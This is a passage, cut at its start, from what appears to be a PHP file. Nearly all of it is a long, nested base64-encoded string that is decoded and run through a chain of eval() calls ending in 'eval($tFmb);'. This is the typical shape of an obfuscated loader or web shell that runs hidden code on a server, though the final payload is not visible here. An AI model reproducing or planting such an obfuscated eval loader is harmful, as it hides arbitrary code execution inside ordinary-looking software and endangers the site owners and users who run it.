NRlp6VmtkS1dXRklSbFZXUlVwTVZGZDRjMlJGTlZaUFYyeFRWMGRvVjFaSGVHcE5WbXhYV2tWa1ZHRXhTbUZaVjNSM1ZrWlNjMVpxUWxOU01GWTJWVmQ0UTJFeVZuSlRhekZXWVRGd1NGcEhlRTlqYkZKelUyMW9UbE5GU25aV2JYQkhZekpTYzFSc1pGVmlSVFZ4VkZkMFlWZFdXa2hOVkZKb1ZqQndlVlJzYUU5WFJrcEdZMFpTV2xaWFVsUlZNRnBMVjFaV2MxSnRiR2hsYkVsNlZtcEdZV0l4VlhkTlZtaFZZV3hhY0ZWclpGTlNiRnBYV1hwV1ZFMVZWalJWYlRWTFZrZEZkMDVXWkZWV2JWSjJWMVpWZUdNeFdsVlRiRlpPWVd0YWVWZFhkR3RWTVVweVRWWnNXR0pWV2xSVVZscDNUbXhXTmxGck9XaE5hMW93VlRGb2QxWkhTbGxoUlRWVlZqTk5lRlJYZUhOa1JURllVbTF3VTJKclJYaFdNVkpQVVRGU1YxZHJWbGRoYkhCWlZtMHhiMkZHYkhKWGExcHNWbFJzV2xadE1VZGhWbGw2WVVSR1ZtVnJTbEJaVkVwVFVqSktSMkpHVW1saE0wSnZWbXBDWVZNd01IaGlTRXBoVWxkU2IxbHJhRU5YUmxGNFlVaGtXbFp0VWtoVk1XaHJWMnhhZEZSWWFGcGlXRkY2V2xaa1YxTldSbk5qUlRWcFVtMDVORlpxUmxOVE1WcDBWVzVTVkdFeWFIQlZhazVEWVVaYWRXTkdaR3BXYlZKNlZrY3hkMkZyTVVobFJWWldUVmRTZWxaRldtRlRWbEp5VDFaS1RtSldTalZXVkVvd1ZERldkRkpZWkdwU2JGcFlWRlZhZDAxV1dYbGxSazVyWVhwV2VsbHJXbk5WYlVwMFZXc3hWbFpGYjNkVVZWcFhVMFV4V0dSSGJGTk5WWEJJVm10amVHSXhaSEpOV0ZKb1UwVTFWMVJXWkU1bFJuQllUVlpPVkZKcmNERldiWGgzVkcxS1IxZHFTbFpsYTFwUFdrUkNlbVZIVGtsVmJYaFRVbFp3ZUZaR1kzaGhNbEp6VkZob1ZtSnVRbFpaVkVFeFpGWnNWVkZ1WkZOU2JGcFpXa1ZXTUZZeFNuUlZhMmhhWWxob00xWnNaRXRPYkdSMFVtczFhVkp0ZDNwV2JYaFRVekpOZVZWc1pHbE5Nbmh6VldwT2IyTnNWblZqU0U1T1Ztc3hNMVpITVRCaFJrcDFVV3RzVlZadGFFUlpWbVJMVjBadmVscEdjR2xTTVVZMlYydGplRlJ0VmxkWGJsWnFVak5DVDFsc2FHNWxWbVJZVFZoT2FHSlZOVWRhVlZwWFZERlplV0ZIYUZaaGExcE1WV3BHY21WVk5WWmtSM1JwVmxSV00xZFdWbFpOVm1SelYxaHNWbUpyTlZaVVZ6VkRUVEZzY1ZKdVpGaFNNVnBLVjJ0a1IxZEdTbGhsUkVwV1RXNUNTMXBWWkVkVFJsSjFWVzEwVTAweWFIbFdWRUpYVXpKV2MxcEdaR0ZTVkd4d1ZXeG9RazFXYkZWVWJFNVdWakJ3UmxsclkzaFdSVEZHVGxaU1dtVnJjRWhXTUZwVFpFZFdTR0pIYkdobGJGbzJWbXBDVTFNeFZYbFNhMmhXWVRKb1ZGWXdXa3RWYkd4elYyMUdUMVp0ZERWVVZWSlhZa1paZDJOR2NGZFNla0Y0VmtWYVZtVlhUalpVYkU1VFlURnZlVlpVU2pCVU1WWjBVbGhrYWxKV1NsbFZiRkpYWld4a1dXTkZPVlZOYXpWSlZURm9jMVF4V1hoalNFcFZWa1ZLTTFwRVJuZFNiSEJIV2tkR2FWSXpVVEZYYkZadldWZEdjazFZVGxkaWJIQlZWRlphUzA1c1draGtSVGxwWWxWV00xa3dWbE5XYkZsNlZXdDRWMkV4Y0hKVmFrcExZekpPUjFadGJHeGlTRUpvVm1wQ1YxTXdNSGhVV0dSVlltdHdjbFZ0ZEV0TlJtUnlXa1JTYUUxVmNIbFpNR2hQVjIxV2NrNVZVbUZTZWtaTVdrWmFVMlJIVmtabFJrcE9ZbXhHTTFac1ZtcE5WbEY1VTJ0b1ZtRXlVbFZaYkdodllVWldjVk5xVWs5V2JWSjZWMnRWTlZSc1NsbFZhMlJWVm0xU2RsZFdWWGhqTVZwVlUyeFdUbUZyV2pKWFYzUnJVekZPVjFKdVVteFNNMEp2Vm1wS1UwMVdXWGhYYlhSV1RXeEtTVlZ0ZUc5VU1WbzJZa2hLVm1KdVFraGFWM2hQWkZkS1NWTnRkRk5oTUc5M1ZqSjBhMDVIUlhoVGJrNVlZV3hhWVZsVVFURmtWbXhYVjI1T1dGSnNXakZXVnpGdlZqSldjMWRxU2xoaE1WcHhXbFZrVG1ReVVYcGlSbHBwVmpKb2VGWkdZM2hpTWs1SFlraEdWR0V5VW5OV2JUVkRVbFpWZUdGRlRsVlNiSEJLVmtkek5WVnJNWFJWYm14V1RXNVNVRlpYTVV0U1YwcEdWbXhhVjJWdGVFMVdWbEpIVWpKTmQwOVdXbFppUlhCd1ZGVm9RMUpXV1hkVmEwcFFWbGhCTWxsNlNqQlhSMHB5VjJ4c1dGWnJOVU5VTVZaelVrWnJlV1JIYUZOaVYyaFhWMVJHVDFGck9WWmlSV2hVWWxkb2NWUlhlRlpsVmxKeVYxUldhRTFZUWxsV1J6VmhXVlpKZUZadVdsUmhNbEp5VlcweFYyTXhiM3BSYkVKc1ZsVndlbGRyWTNoU01rMTNaRVZTVm1KVWJGbFZiWGhMVGtaTmVGVnVjR2xoZW1nMVZtMXdTMWRzV1hwYVNGcFVZVEZ3TTFwVldscGxWa3BaVVd4Q2EyVnFRVFZUYm5CNllURldSMXBJYUZoaFZVVTFVMVZPYW1FeVVuTlNiVVpxWVZWRk5WTlZaRXRoUjAxNVZsUktUMUpxYkhKWGJHUlBaR3h3U0ZaWE9VdFRTRUpaV2tWYVJtTkZPVFZSYlhocllsVmFlbE13VGxOTmJGWlhZMGhzVEZaSVRuVlVla3BYVFd4c1dHUXlPVXRTYTBwWldURmFkbU5GT1ROUVZEQnVUM2xTVUdWSVRsSkpSREJuU25sU1NsVnVUbGxKUkRCbldXMUdlbHBVV1RCWU1sSnNXVEk1YTFwVFoydGFNSEJoWlVOck4wbEhWakpaVjNkdlNrVnNVMk14WjNCUGVXTTNXbGhhYUdKRFoydFVNMmg2VlZOck55YzdKRkY0UkhJZ1BTQW5KRTE0ZWxjZ1BTQmlZWE5sTmpSZlpHVmpiMlJsS0NSSWMxcFVLVHNnWlhaaGJDZ2tUWGg2VnlrN0p6dGxkbUZzS0NSUmVFUnlLVHM9JzskUWVYYSA9ICckc1F6VyA9IGJhc2U2NF9kZWNvZGUoJG9JWFEpOyBldmFsKCRzUXpXKTsnO2V2YWwoJFFlWGEpOw==');
        eval($tFmb);
    }
}
